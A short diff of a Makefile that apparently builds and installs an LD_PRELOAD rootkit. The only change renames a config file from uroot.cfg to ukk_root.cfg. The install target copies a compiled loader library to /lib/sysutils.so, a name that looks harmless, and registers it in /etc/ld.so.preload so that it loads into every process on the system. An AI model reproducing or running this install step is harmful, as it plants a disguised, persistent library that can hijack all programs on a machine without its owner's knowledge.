@@ -6,6 +6,6 @@ dist/loader.so: $(SRCS) $(HEADERS)
 	gcc -shared -fPIC $(SRCS) -o $@ -ldl -lconfig -nostartfiles
 
 install:
-	cp uroot.cfg /etc/uroot.cfg
+	cp ukk_root.cfg /etc/ukk_root.cfg
 	cp dist/loader.so /lib/sysutils.so 
 	echo /lib/sysutils.so > /etc/ld.so.preload
